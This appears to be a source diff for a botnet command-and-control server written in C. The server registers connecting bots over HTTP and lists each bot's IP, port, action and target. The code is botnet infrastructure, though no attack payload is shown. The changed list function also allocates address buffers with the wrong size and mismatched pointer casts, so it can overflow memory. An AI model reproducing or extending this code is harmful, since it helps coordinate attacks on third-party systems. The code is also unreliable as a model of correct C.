@@ -23,7 +23,7 @@
 
 // BOT -> Critical section
 
-active_bots *botnet;
+active_bots *botnet = NULL;
 sem_t r, w;
 int readcount, ret, sock_fd;
 struct MHD_Daemon *mhd_daemon;
@@ -52,35 +52,34 @@ int handle_request(void *cls, struct MHD_Connection *connection, const char *url
     const char *bot_ip = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_IP);
     const char *bot_port = MHD_lookup_connection_value(connection, MHD_GET_ARGUMENT_KIND, C_PORT);
 
-    printf("Connected bot : %s:%s \n", bot_ip, bot_port);
-
     ret = registerBot(bot_ip, bot_port);
+
     if (ret < 0)
     {
         const char *msg = "NOT OK";
     }
 
+    printf("Bot Connected \n");
+    list_botnet(1);
     MHD_destroy_response(response);
 
     return ret;
 }
-
+// ! MAIN
 int main(int argc, char const *argv[])
 {
-    /* Accept connections from bots
-
-        accept
-        receive info and save them in active_bots;
-        send close message
-        close connection
-    */
 
     int bot_fd, pid;
 
     ret = initializeSemaphores();
 
     botnet = (active_bots *)malloc(sizeof(active_bots));
+    if (botnet == NULL)
+    {
+        handle_error("Botnet could not be initialized");
+    }
     botnet->next = NULL;
+    botnet->bot_id = 0;
 
     pid = fork();
     if (pid < 0)
@@ -143,15 +142,23 @@ int list_botnet(int active)
 
     active_bots *bot = botnet;
 
+    if (botnet == NULL)
+    {
+        printf("Botnet is empty \n");
+        return -1;
+    }
+
+        char * target_ip = (char**) malloc(sizeof(INET_ADDRSTRLEN));
+        char * bot_ip = (char**) malloc(sizeof(INET_ADDRSTRLEN));
     while (bot != NULL)
     {
         if (active == 1)
         {
 
-            char *bot_ip = inet_ntoa(bot->bot_address);
-            char *target_ip = inet_ntoa(bot->target_address);
+            inet_ntop(AF_INET,&(bot->bot_address),bot_ip,INET_ADDRSTRLEN);
+            inet_ntop(AF_INET,&(bot->target_address),target_ip,INET_ADDRSTRLEN);
 
-            printf("BOT_ID: %d - IP: %s - ACTION: %s  - TARGET: %s \n", bot->bot_id, bot_ip, bot->action, target_ip);
+            printf("BOT_ID: %d - IP: %s - PORT: %ld - ACTION: %s  - TARGET: %s \n", bot->bot_id, bot_ip, bot->port, bot->action, target_ip);
         }
         else
         {
@@ -433,69 +440,36 @@ int registerBot(const char *bot_ip, const char *bot_port)
 {
 
     int res = 1;
-    int ret = sem_wait(&r);
+
+    int ret = sem_wait(&w);
     if (ret < 0)
     {
         handle_error("Error in wait sem w");
     }
 
-    readcount++;
+    active_bots *bot = botnet;
 
-    if (readcount == 1)
+    int id = 1;
+    while (bot->next != NULL)
     {
-
-        ret = sem_wait(&w);
-        if (ret < 0)
-        {
-            handle_error("Error in wait sem w");
-        }
+        id += 1;
+        bot = bot->next;
     }
 
-    ret = sem_post(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in post sem w");
-    }
+    bot->next = (active_bots *)malloc(sizeof(active_bots));
 
-    if (botnet == NULL)
-        return -1;
-
-    active_bots *current_bot = botnet;
-
-    active_bots *bot = (active_bots *)malloc(sizeof(active_bots));
-    int id = bot->bot_id;
-    while (current_bot != NULL)
-    {
-        id++;
-        current_bot = current_bot->next;
-    }
-
-    ret = inet_aton(bot_ip, &(bot->bot_address));
+    ret = inet_pton(AF_INET,bot_ip, &(bot->next->bot_address));
     if (ret == 0)
     {
         handle_error("Could not parse bot_ip to in_addr");
         res = -1;
     }
 
-    bot->port = atol(bot_port);
-    bot->next = NULL;
-    bot->bot_id = id;
+    bot->next->bot_id = id;
+    bot->next->port = atol(bot_port);
+    bot->next->next = NULL;
 
-    current_bot = bot;
-
-    ret = sem_wait(&r);
-    if (ret < 0)
-    {
-        handle_error("Error in wait sem w");
-    }
-    readcount--;
-    if (readcount == 0)
-        ret = sem_post(&w);
-    if (ret < 0)
-    {
-        handle_error("Error in post sem w");
-    }
-    ret = sem_post(&r);
+    ret = sem_post(&w);
     if (ret < 0)
     {
         handle_error("Error in post sem w");
